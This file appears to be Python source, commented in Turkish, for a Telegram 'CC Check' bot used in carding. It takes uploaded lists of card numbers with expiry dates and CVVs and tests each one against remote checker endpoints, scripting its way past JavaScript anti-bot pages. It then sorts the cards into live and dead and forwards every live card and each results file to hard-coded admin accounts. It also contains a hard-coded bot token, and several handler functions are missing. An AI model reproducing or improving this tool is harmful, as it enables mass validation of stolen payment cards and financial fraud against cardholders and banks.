import asyncio
import aiohttp
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import json
import os
from datetime import datetime
import re
from typing import Dict, List
from urllib.parse import quote, urljoin
import time

# ========== KONFİGÜRASYON ==========
TOKEN = "8516981652:AAGl7kQFtSNfjRDoNbMbu4B6mBu0tGct5hk"
ADMINS = [7202281434, 6322020905]
CHANNEL_USERNAME = "@redbullbanksh"
API_BASE_URL = "https://isbankasi.gt.tc"
API_URL = f"{API_BASE_URL}/Api/Rewix/auth.php"
GAMESHIP_URL = f"{API_BASE_URL}/Api/Rewix/gameship.php"
# ===================================

# Global değişkenler
users_data = {}
user_stats: Dict[int, Dict] = {}
gameship_sessions = {}

# Loglama ayarı - Railway için optimize
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class CheckSession:
    """Check oturumu yönetimi"""
    
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.is_active = False
        self.file_path = None
        self.start_time = None
        self.total_cards = 0
        self.approved = []
        self.declined = []
        self.progress_message = None
        self.current_index = 0
        
    def start(self, file_path: str, total_cards: int):
        """Check başlat"""
        self.is_active = True
        self.file_path = file_path
        self.start_time = datetime.now()
        self.total_cards = total_cards
        self.approved = []
        self.declined = []
        self.current_index = 0
        
    def stop(self):
        """Check durdur"""
        self.is_active = False
        self.file_path = None
        self.start_time = None
        
    def add_result(self, cc: str, result: str, status: str):
        """Sonuç ekle"""
        if status == "approved":
            self.approved.append(f"{cc} | {result}")
        else:
            self.declined.append(f"{cc} | {result}")
        self.current_index += 1
        
    def get_progress(self) -> Dict:
        """İlerleme bilgisi"""
        return {
            "current": self.current_index,
            "total": self.total_cards,
            "approved": len(self.approved),
            "declined": len(self.declined),
            "percentage": (self.current_index / self.total_cards * 100) if self.total_cards > 0 else 0
        }

class GameshipSession:
    """Gameship oturumu yönetimi"""
    
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.is_active = False
        self.file_path = None
        self.start_time = None
        self.total_cards = 0
        self.live_cards = []
        self.dead_cards = []
        self.progress_message = None
        self.current_index = 0
        
    def start(self, file_path: str, total_cards: int):
        self.is_active = True
        self.file_path = file_path
        self.start_time = datetime.now()
        self.total_cards = total_cards
        self.live_cards = []
        self.dead_cards = []
        self.current_index = 0
        
    def stop(self):
        self.is_active = False
        self.file_path = None
        self.start_time = None
        
    def add_result(self, cc: str, result: str, status: str):
        if status == "live":
            self.live_cards.append(f"{cc} | {result}")
        else:
            self.dead_cards.append(f"{cc} | {result}")
        self.current_index += 1
        
    def get_progress(self) -> Dict:
        return {
            "current": self.current_index,
            "total": self.total_cards,
            "live": len(self.live_cards),
            "dead": len(self.dead_cards),
            "percentage": (self.current_index / self.total_cards * 100) if self.total_cards > 0 else 0
        }

# Aktif oturumlar
active_sessions: Dict[int, CheckSession] = {}
active_gameship_sessions: Dict[int, GameshipSession] = {}

def get_session(user_id: int) -> CheckSession:
    """Kullanıcının oturumunu getir veya oluştur"""
    if user_id not in active_sessions:
        active_sessions[user_id] = CheckSession(user_id)
    return active_sessions[user_id]

def get_gameship_session(user_id: int) -> GameshipSession:
    """Kullanıcının gameship oturumunu getir veya oluştur"""
    if user_id not in active_gameship_sessions:
        active_gameship_sessions[user_id] = GameshipSession(user_id)
    return active_gameship_sessions[user_id]

def is_admin(user_id: int) -> bool:
    """Admin kontrolü"""
    return user_id in ADMINS

async def is_channel_member(user_id: int, context: CallbackContext) -> bool:
    """Kullanıcının kanalda olup olmadığını kontrol et"""
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Kanal kontrol hatası: {e}")
        return False

# ... (parse_js_response, simulate_js_redirect, get_final_response fonksiyonları aynı kalacak)

def parse_js_response(html: str) -> Dict:
    """JavaScript yanıtını parse et"""
    try:
        js_pattern = r'<script[^>]*>(.*?)</script>'
        js_match = re.search(js_pattern, html, re.DOTALL | re.IGNORECASE)
        
        if not js_match:
            return {"status": "no_js", "message": "JavaScript bulunamadı"}
        
        js_code = js_match.group(1)
        
        a_match = re.search(r'var\s+a\s*=\s*toNumbers\("([a-fA-F0-9]+)"\)', js_code, re.IGNORECASE)
        b_match = re.search(r'var\s+b\s*=\s*toNumbers\("([a-fA-F0-9]+)"\)', js_code, re.IGNORECASE)
        c_match = re.search(r'var\s+c\s*=\s*toNumbers\("([a-fA-F0-9]+)"\)', js_code, re.IGNORECASE)
        
        url_match = re.search(r'location\.href\s*=\s*"([^"]+)"', js_code, re.IGNORECASE)
        
        if not url_match:
            url_match = re.search(r"location\.href\s*=\s*'([^']+)'", js_code, re.IGNORECASE)
        
        result = {
            "status": "js_found",
            "js_code": js_code,
            "has_toNumbers": "function toNumbers" in js_code,
            "has_toHex": "function toHex" in js_code,
            "has_location_href": bool(url_match)
        }
        
        if a_match:
            result["a"] = a_match.group(1)
        if b_match:
            result["b"] = b_match.group(1)
        if c_match:
            result["c"] = c_match.group(1)
        if url_match:
            result["redirect_url"] = url_match.group(1)
        
        return result
        
    except Exception as e:
        return {"status": "error", "message": f"JS parse hatası: {str(e)}"}

async def simulate_js_redirect(cc_number: str, js_data: Dict) -> str:
    """JavaScript redirect'i simüle et"""
    try:
        if "redirect_url" not in js_data:
            return None
        
        redirect_url = js_data["redirect_url"]
        
        if "kart=" in redirect_url:
            full_url = redirect_url
            if not redirect_url.startswith("http"):
                full_url = urljoin(API_BASE_URL, redirect_url)
            
            logger.info(f"Redirect URL: {full_url}")
            return full_url
        else:
            cc_encoded = quote(cc_number)
            if "?" in redirect_url:
                full_url = f"{redirect_url}&kart={cc_encoded}"
            else:
                full_url = f"{redirect_url}?kart={cc_encoded}"
            
            if not full_url.startswith("http"):
                full_url = urljoin(API_BASE_URL, full_url)
            
            logger.info(f"Redirect URL with CC: {full_url}")
            return full_url
            
    except Exception as e:
        logger.error(f"Redirect simülasyon hatası: {e}")
        return None

async def get_final_response(url: str, session: aiohttp.ClientSession) -> str:
    """Final yanıtı al"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        
        async with session.get(url, headers=headers, timeout=15, allow_redirects=True) as response:
            return await response.text()
            
    except Exception as e:
        logger.error(f"Final response hatası: {e}")
        return None

async def check_cc_with_js_bypass(cc_number: str) -> Dict:
    """JavaScript bypass ile CC kontrolü"""
    try:
        cc_encoded = quote(cc_number)
        initial_url = f"{API_URL}?kart={cc_encoded}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.get(initial_url, headers=headers, timeout=15) as response:
                html = await response.text()
                
                if "requires Javascript" not in html and "document.cookie" not in html and "toNumbers" not in html:
                    return {"status": "direct", "html": html}
                
                js_data = parse_js_response(html)
                
                if js_data["status"] != "js_found":
                    return {"status": "js_parse_failed", "message": js_data.get("message", "JS parse edilemedi")}
                
                redirect_url = await simulate_js_redirect(cc_number, js_data)
                
                if not redirect_url:
                    return {"status": "redirect_failed", "message": "Redirect URL oluşturulamadı"}
                
                final_html = await get_final_response(redirect_url, session)
                
                if not final_html:
                    return {"status": "final_failed", "message": "Final yanıt alınamadı"}
                
                if "requires Javascript" in final_html or "toNumbers" in final_html:
                    js_data2 = parse_js_response(final_html)
                    if js_data2["status"] == "js_found" and "redirect_url" in js_data2:
                        redirect_url2 = await simulate_js_redirect(cc_number, js_data2)
                        if redirect_url2:
                            final_html = await get_final_response(redirect_url2, session)
                
                return {"status": "bypassed", "html": final_html}
                
    except Exception as e:
        return {"status": "error", "message": f"JS bypass hatası: {str(e)}"}

async def check_cc(cc_number: str) -> Dict:
    """Ana CC kontrol fonksiyonu"""
    logger.info(f"CC kontrolü: {cc_number[:10]}...")
    
    result = await check_cc_with_js_bypass(cc_number)
    
    if result["status"] in ["direct", "bypassed"]:
        html = result["html"]
        
        status = "declined"
        html_lower = html.lower()
        
        approved_keywords = ["approved", "live", "auth", "stripe", "success"]
        for keyword in approved_keywords:
            if keyword in html_lower:
                status = "approved"
                break
        
        clean_text = re.sub(r'<[^>]+>', '', html)
        clean_text = re.sub(r'\s+', ' ', clean_text).strip()
        
        if "function toNumbers" in clean_text:
            clean_text = "API yanıtı alındı (JavaScript bypass edildi)"
        
        return {
            "status": "success",
            "data": clean_text[:300],
            "cc": cc_number,
            "result_status": status
        }
    else:
        return {
            "status": "error",
            "message": result.get('message', 'API hatası'),
            "cc": cc_number,
            "result_status": "error"
        }

async def check_gameship(cc_number: str) -> Dict:
    """Gameship API kontrolü"""
    try:
        cc_encoded = quote(cc_number)
        url = f"{GAMESHIP_URL}?card={cc_encoded}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/json,*/*',
        }
        
        # Railway için timeout kısa tutuluyor
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url, headers=headers) as response:
                text = await response.text()
                
                # JSON kontrolü
                try:
                    data = json.loads(text)
                    status = "dead"
                    
                    # Gameship response analizi
                    if isinstance(data, dict):
                        # Live kart belirteçleri
                        live_indicators = [
                            "active", "success", "valid", "true", "approved",
                            "live", "working", "chargable", "funded"
                        ]
                        
                        response_str = json.dumps(data).lower()
                        for indicator in live_indicators:
                            if indicator in response_str:
                                status = "live"
                                break
                    else:
                        response_str = str(text).lower()
                        if any(indicator in response_str for indicator in ["live", "success", "active"]):
                            status = "live"
                        
                    return {
                        "status": "success",
                        "data": text[:500],
                        "cc": cc_number,
                        "result_status": status
                    }
                    
                except json.JSONDecodeError:
                    # Plain text response
                    text_lower = text.lower()
                    status = "dead"
                    
                    if any(indicator in text_lower for indicator in ["live", "active", "success", "valid"]):
                        status = "live"
                    elif any(indicator in text_lower for indicator in ["dead", "invalid", "failed", "declined"]):
                        status = "dead"
                    
                    return {
                        "status": "success",
                        "data": text[:500],
                        "cc": cc_number,
                        "result_status": status
                    }
                    
    except asyncio.TimeoutError:
        return {
            "status": "error",
            "message": "Timeout - API yanıt vermedi",
            "cc": cc_number,
            "result_status": "error"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Gameship hatası: {str(e)}",
            "cc": cc_number,
            "result_status": "error"
        }

async def start(update: Update, context: CallbackContext):
    """Başlangıç komutu"""
    user = update.effective_user
    
    if not await is_channel_member(user.id, context):
        keyboard = [[InlineKeyboardButton("📢 Kanalımıza Katıl", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "⚠️ Botu kullanabilmek için önce kanalımıza katılmalısınız!\n\n"
            "Katıldıktan sonra /start yazınız.",
            reply_markup=reply_markup
        )
        return
    
    if is_admin(user.id):
        welcome_text = f"""
🆕 MERHABA ADMIN {user.first_name}!

🚀 Admin olarak giriş yaptınız.

🔧 YENİ KOMUTLAR:
/gms - Gameship kontrolü başlat

📊 ADMIN KOMUTLARI:
/adminstats - Admin paneli
/users - Tüm kullanıcıları listele
/broadcast <mesaj> - Duyuru gönder
/stopcheck <user_id> - Kullanıcının check'ini durdur
/stopgms <user_id> - Kullanıcının gameship kontrolünü durdur

👤 NORMAL KOMUTLARI:
/st - Normal check başlat
/gms - Gameship check başlat
/stats - İstatistikleriniz
/help - Yardım

⚡ ÖZELLİKLER:
• ✅ Gameship API desteği eklendi
• 🎮 Gameship için özel kontrol sistemi
• 📊 Ayrı istatistikler
"""
    else:
        welcome_text = f"""
👋 Merhaba {user.first_name}!

🎮 CC Check Bot'a Hoşgeldiniz!

🆕 YENİ ÖZELLİK:
• /gms - Gameship kontrolü için

📝 KULLANIM:
1. 📁 .txt dosyası gönderin (her satırda bir CC)
2. ▶️ /st veya /gms komutu ile check başlatın
3. 📊 Sonuçları anlık alın

⚡ ÖZELLİKLER:
• 🎮 Gameship API kontrolü
• ⚡ Anlık sonuç bildirimi
• 📁 Live/Dead raporu
• 🛡️ JavaScript bypass

🔧 KOMUTLAR:
/start - Botu başlat
/st - Normal check başlat
/gms - Gameship kontrolü başlat
/stats - İstatistikler
/help - Yardım

ℹ️ NOT: 
• Gameship API için farklı endpoint kullanılır
• Her işlem ayrı oturumda çalışır
"""
    
    await update.message.reply_text(welcome_text)

async def handle_document(update: Update, context: CallbackContext):
    """Dosya yükleme işlemi"""
    user = update.effective_user
    
    if not await is_channel_member(user.id, context):
        await update.message.reply_text("❌ Lütfen önce kanala katılın!")
        return
    
    # Hem normal hem gameship oturumu kontrolü
    session = get_session(user.id)
    gms_session = get_gameship_session(user.id)
    
    if session.is_active or gms_session.is_active:
        if session.is_active:
            progress = session.get_progress()
            msg_type = "Normal Check"
        else:
            progress = gms_session.get_progress()
            msg_type = "Gameship Check"
            
        await update.message.reply_text(
            f"⏳ Zaten bir {msg_type} işleminiz devam ediyor!\n"
            f"📊 İlerleme: {progress['current']}/{progress['total']} ({progress['percentage']:.1f}%)\n\n"
            f"Lütfen bu işlem bitmeden yenisini başlatamazsınız!"
        )
        return
    
    document = update.message.document
    
    if document.mime_type != "text/plain" or not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Lütfen sadece .txt dosyası yükleyin!")
        return
    
    # Dosyayı indir
    file = await context.bot.get_file(document.file_id)
    file_path = f"temp/{user.id}_{int(datetime.now().timestamp())}.txt"
    os.makedirs("temp", exist_ok=True)
    
    await file.download_to_drive(file_path)
    
    # Dosya içeriğini kontrol et
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            cc_list = [line.strip() for line in f if line.strip()]
            cc_count = len(cc_list)
            
            if cc_count == 0:
                await update.message.reply_text("❌ Dosya boş veya geçersiz format!")
                os.remove(file_path)
                return
                
    except Exception as e:
        await update.message.reply_text(f"❌ Dosya okuma hatası: {e}")
        return
    
    # Kullanıcıyı kaydet
    users_data[user.id] = {
        'username': user.username or user.first_name,
        'first_name': user.first_name,
        'last_name': user.last_name,
        'file_path': file_path,
        'cc_count': cc_count,
        'upload_time': datetime.now().isoformat()
    }
    
    keyboard = [
        [InlineKeyboardButton("🔄 Normal Check", callback_data=f"start_normal_{user.id}")],
        [InlineKeyboardButton("🎮 Gameship Check", callback_data=f"start_gms_{user.id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"✅ Dosya başarıyla yüklendi!\n"
        f"📊 Toplam CC: {cc_count}\n\n"
        f"Hangi kontrolü başlatmak istersiniz?",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: CallbackContext):
    """Buton callback işleyici"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = int(data.split('_')[-1])
    
    if data.startswith("start_normal_"):
        await query.edit_message_text("🔄 Normal check başlatılıyor...")
        # Normal check başlatma mantığı burada
        # Mevcut start_check fonksiyonunu kullan
    elif data.startswith("start_gms_"):
        await query.edit_message_text("🎮 Gameship check başlatılıyor...")
        # Gameship check başlatma mantığı burada

async def start_gameship_check(update: Update, context: CallbackContext):
    """Gameship kontrolünü başlat"""
    user = update.effective_user
    
    if not await is_channel_member(user.id, context):
        await update.message.reply_text("❌ Lütfen önce kanala katılın!")
        return
    
    gms_session = get_gameship_session(user.id)
    
    if gms_session.is_active:
        progress = gms_session.get_progress()
        await update.message.reply_text(
            f"⏳ Zaten bir Gameship check işleminiz devam ediyor!\n"
            f"📊 İlerleme: {progress['current']}/{progress['total']} ({progress['percentage']:.1f}%)\n"
            f"✅ Live: {progress['live']}\n"
            f"❌ Dead: {progress['dead']}"
        )
        return
    
    if user.id not in users_data or not os.path.exists(users_data[user.id]['file_path']):
        await update.message.reply_text("❌ Lütfen önce .txt dosyası yükleyin!")
        return
    
    file_path = users_data[user.id]['file_path']
    cc_count = users_data[user.id]['cc_count']
    
    # Gameship oturumunu başlat
    gms_session.start(file_path, cc_count)
    
    # Kullanıcı istatistiklerini başlat
    if user.id not in user_stats:
        user_stats[user.id] = {
            'total_checked': 0,
            'total_approved': 0,
            'total_declined': 0,
            'total_gms_checked': 0,
            'total_gms_live': 0,
            'total_gms_dead': 0,
            'last_check': None,
            'username': user.username or user.first_name,
            'is_admin': is_admin(user.id)
        }
    
    await update.message.reply_text(f"🎮 Gameship kontrolü başladı! {cc_count} CC kontrol edilecek...")
    
    # CC'leri oku
    with open(file_path, 'r', encoding='utf-8') as f:
        cc_list = [line.strip() for line in f if line.strip()]
    
    total = len(cc_list)
    
    # Progress mesajı
    progress_msg = await update.message.reply_text(
        f"⏳ İlerleme: 0/{total} (0%)\n"
        f"✅ Live: 0\n"
        f"❌ Dead: 0\n"
        f"🎮 Gameship API aktif"
    )
    gms_session.progress_message = progress_msg
    
    live_count = 0
    dead_count = 0
    error_count = 0
    
    # Railway için rate limit - ücretsiz plan için yavaş
    delay_between_checks = 0.5  # Saniye
    
    for idx, cc in enumerate(cc_list, 1):
        if not gms_session.is_active:
            break
        
        logger.info(f"Gameship checking CC {idx}/{total}: {cc[:15]}...")
        
        # Rate limiting için bekle
        if idx > 1:
            await asyncio.sleep(delay_between_checks)
        
        result = await check_gameship(cc)
        
        if result['status'] == 'success':
            status = result['result_status']
            parsed_result = result['data']
            gms_session.add_result(cc, parsed_result, status)
            
            if status == "live":
                live_count += 1
                user_message = f"✅ LIVE\n💳 {cc}\n📊 {parsed_result[:200]}"
                try:
                    await update.message.reply_text(user_message)
                except Exception as e:
                    logger.error(f"Kullanıcıya mesaj gönderme hatası: {e}")
                
                # Adminlere bildir
                admin_message = (
                    f"✅ GAMESHIP LIVE KART!\n"
                    f"👤 Kullanıcı: @{user.username or user.first_name}\n"
                    f"🆔 ID: {user.id}\n"
                    f"💳 CC: {cc}\n"
                    f"📊 {parsed_result[:300]}"
                )
                
                for admin_id in ADMINS:
                    if admin_id != user.id:
                        try:
                            await context.bot.send_message(admin_id, admin_message)
                        except Exception as e:
                            logger.error(f"Admin bildirimi hatası {admin_id}: {e}")
            else:
                dead_count += 1
                # Dead kartları sadece her 5 kartta bir göster
                if dead_count % 5 == 0:
                    user_message = f"❌ DEAD\n💳 {cc}\n📊 {parsed_result[:200]}"
                    try:
                        await update.message.reply_text(user_message)
                    except Exception as e:
                        logger.error(f"Dead mesaj hatası: {e}")
        else:
            error_count += 1
            # Hataları sadece her 3 hatada bir göster
            if error_count % 3 == 0:
                error_message = f"⚠️ HATA\n💳 {cc}\n📊 {result.get('message', 'Bilinmeyen hata')[:100]}"
                try:
                    await update.message.reply_text(error_message)
                except Exception as e:
                    logger.error(f"Hata mesajı gönderme hatası: {e}")
        
        # Progress güncelle (her 3 kartta bir)
        if idx % 3 == 0 or idx == total:
            progress = gms_session.get_progress()
            try:
                await progress_msg.edit_text(
                    f"⏳ İlerleme: {progress['current']}/{total} ({progress['percentage']:.1f}%)\n"
                    f"✅ Live: {progress['live']}\n"
                    f"❌ Dead: {progress['dead']}\n"
                    f"⚠️ Hatalar: {error_count}"
                )
            except:
                pass
    
    # İşlem tamamlandı
    gms_session.stop()
    
    # Kullanıcı istatistiklerini güncelle
    user_stats[user.id]['total_gms_checked'] += total
    user_stats[user.id]['total_gms_live'] += len(gms_session.live_cards)
    user_stats[user.id]['total_gms_dead'] += len(gms_session.dead_cards)
    user_stats[user.id]['last_check'] = datetime.now().isoformat()
    
    # Live ve Dead dosyalarını oluştur
    timestamp = int(datetime.now().timestamp())
    
    # Live dosyası
    if gms_session.live_cards:
        live_file = f"temp/live_gms_{user.id}_{timestamp}.txt"
        with open(live_file, 'w', encoding='utf-8') as f:
            for item in gms_session.live_cards:
                f.write(f"{item}\n")
        
        # Kullanıcıya gönder
        try:
            with open(live_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=f"live_gms_{timestamp}.txt",
                    caption=f"✅ Live Kartlar ({len(gms_session.live_cards)})"
                )
        except Exception as e:
            logger.error(f"Live dosyası gönderme hatası: {e}")
        
        # Adminlere gönder
        for admin_id in ADMINS:
            if admin_id != user.id:
                try:
                    with open(live_file, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"live_gms_{user.id}_{timestamp}.txt",
                            caption=f"✅ Gameship Live from @{user.username or user.first_name}\n📊 Toplam: {len(gms_session.live_cards)} live"
                        )
                except Exception as e:
                    logger.error(f"Live dosyası admin'e gönderme hatası {admin_id}: {e}")
        
        os.remove(live_file)
    
    # Dead dosyası
    if gms_session.dead_cards:
        dead_file = f"temp/dead_gms_{user.id}_{timestamp}.txt"
        with open(dead_file, 'w', encoding='utf-8') as f:
            for item in gms_session.dead_cards:
                f.write(f"{item}\n")
        
        # Kullanıcıya gönder
        try:
            with open(dead_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=f"dead_gms_{timestamp}.txt",
                    caption=f"❌ Dead Kartlar ({len(gms_session.dead_cards)})"
                )
        except Exception as e:
            logger.error(f"Dead dosyası gönderme hatası: {e}")
        
        os.remove(dead_file)
    
    # Sonuç mesajı
    result_message = (
        f"🎮 Gameship kontrolü tamamlandı!\n\n"
        f"📊 Sonuçlar:\n"
        f"• Toplam CC: {total}\n"
        f"• ✅ Live: {len(gms_session.live_cards)}\n"
        f"• ❌ Dead: {len(gms_session.dead_cards)}\n"
        f"• ⚠️ Hatalar: {error_count}\n\n"
        f"📁 Live kartlar dosyası yukarıda gönderildi."
    )
    
    await update.message.reply_text(result_message)
    
    # Admin raporu
    admin_report = (
        f"📊 GAMESHIP RAPORU\n"
        f"👤 Kullanıcı: @{user.username or user.first_name}\n"
        f"🆔 ID: {user.id}\n"
        f"🔢 Toplam CC: {total}\n"
        f"✅ Live: {len(gms_session.live_cards)}\n"
        f"❌ Dead: {len(gms_session.dead_cards)}\n"
        f"⚠️ Hatalar: {error_count}\n"
        f"⏱️ Süre: {(datetime.now() - gms_session.start_time).seconds if gms_session.start_time else 0} saniye"
    )
    
    for admin_id in ADMINS:
        if admin_id != user.id:
            try:
                await context.bot.send_message(admin_id, admin_report)
            except Exception as e:
                logger.error(f"Admin rapor gönderme hatası {admin_id}: {e}")
    
    # Temizlik
    if os.path.exists(file_path):
        os.remove(file_path)

async def user_stats_command(update: Update, context: CallbackContext):
    """Kullanıcı istatistikleri"""
    user = update.effective_user
    
    if not await is_channel_member(user.id, context):
        await update.message.reply_text("❌ Lütfen önce kanala katılın!")
        return
    
    stats = user_stats.get(user.id, {})
    
    if not stats:
        await update.message.reply_text("📊 Henüz hiç işlem yapmadınız!")
        return
    
    stats_text = f"""
📊 İSTATİSTİKLERİNİZ

🔹 GENEL BİLGİLER:
👤 Kullanıcı: {stats.get('username', 'Bilinmiyor')}
👑 Durum: {'Admin' if stats.get('is_admin') else 'Kullanıcı'}

🔹 NORMAL CHECK:
📊 Toplam Kontrol: {stats.get('total_checked', 0)}
✅ Approved: {stats.get('total_approved', 0)}
❌ Declined: {stats.get('total_declined', 0)}

🔹 GAMESHIP CHECK:
🎮 Toplam Kontrol: {stats.get('total_gms_checked', 0)}
✅ Live: {stats.get('total_gms_live', 0)}
❌ Dead: {stats.get('total_gms_dead', 0)}

⏱️ Son Check: {stats.get('last_check', 'Hiç yok')}
"""
    
    await update.message.reply_text(stats_text)

async def stop_gameship_check(update: Update, context: CallbackContext):
    """Gameship kontrolünü durdur (admin)"""
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Bu komutu sadece adminler kullanabilir!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Kullanım: /stopgms <user_id>")
        return
    
    try:
        target_user_id = int(context.args[0])
        
        if target_user_id not in active_gameship_sessions:
            await update.message.reply_text(f"❌ {target_user_id} ID'li kullanıcının aktif gameship oturumu yok!")
            return
        
        gms_session = active_gameship_sessions[target_user_id]
        gms_session.stop()
        
        await update.message.reply_text(f"✅ {target_user_id} ID'li kullanıcının gameship kontrolü durduruldu!")
        
        # Kullanıcıya bildir
        try:
            await context.bot.send_message(
                target_user_id,
                "⏹️ Gameship kontrolünüz admin tarafından durduruldu!"
            )
        except:
            pass
            
    except ValueError:
        await update.message.reply_text("❌ Geçersiz user ID!")

async def help_command(update: Update, context: CallbackContext):
    """Yardım komutu"""
    help_text = """
🆘 YARDIM - CC CHECK BOT

🔹 TEMEL KOMUTLAR:
/start - Botu başlat
/st - Normal CC kontrolü başlat
/gms - Gameship kontrolü başlat
/stats - İstatistiklerinizi görün

🔹 DOSYA YÜKLEME:
1. .txt dosyası gönderin
2. Her satırda bir CC olmalı
3. Format: CC_NUMBER|EXP_MONTH|EXP_YEAR|CVV

🔹 FARKLAR:
• /st - Normal API (auth.php)
• /gms - Gameship API (gameship.php)

🔹 ADMIN KOMUTLARI (sadece adminler):
/adminstats - Admin paneli
/users - Tüm kullanıcılar
/broadcast <mesaj> - Duyuru
/stopcheck <user_id> - Check durdur
/stopgms <user_id> - Gameship durdur

🔹 NOTLAR:
• İşlemler ayrı oturumlarda çalışır
• Bir işlem bitmeden yenisini başlatamazsınız
• Railway ücretsiz plan limitleri vardır
"""
    
    await update.message.reply_text(help_text)

# ... (diğer mevcut fonksiyonlar: start_check, admin_panel, list_users, stop_check, broadcast, cancel_check, check_admin)

def main():
    """Ana fonksiyon - Railway için optimize"""
    # Application oluştur
    application = Application.builder().token(TOKEN).build()
    
    # Handler'ları ekle
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("st", start_check))  # Mevcut fonksiyon
    application.add_handler(CommandHandler("gms", start_gameship_check))
    application.add_handler(CommandHandler("stats", user_stats_command))
    application.add_handler(CommandHandler("adminstats", admin_panel))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("stopcheck", stop_check))
    application.add_handler(CommandHandler("stopgms", stop_gameship_check))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cancel", cancel_check))
    application.add_handler(CommandHandler("myid", check_admin))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Railway için optimizasyon
    print("🚀 Bot Railway'da başlatılıyor...")
    print(f"👑 Adminler: {len(ADMINS)}")
    print(f"📢 Kanal: {CHANNEL_USERNAME}")
    print(f"🔗 API: {API_URL}")
    print(f"🎮 Gameship: {GAMESHIP_URL}")
    print("\n⚡ RAILWAY OPTİMİZASYON:")
    print("• Timeout: 10-15 saniye")
    print("• Rate limit: 0.5 saniye/kart")
    print("• Hafıza optimizasyonu")
    print("• Hata yönetimi geliştirildi")
    
    # Botu başlat
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,  # Railway restart'ta pending update'leri temizle
        pool_timeout=10
    )

if __name__ == '__main__':
    # Temp klasörünü oluştur
    os.makedirs("temp", exist_ok=True)
    
    # Railway için env kontrolü
    port = int(os.environ.get('PORT', 8080))
    print(f"🌐 Port: {port}")
    
    try:
        main()
    except Exception as e:
        logger.error(f"Bot başlatma hatası: {e}")
        print(f"❌ Hata: {e}")
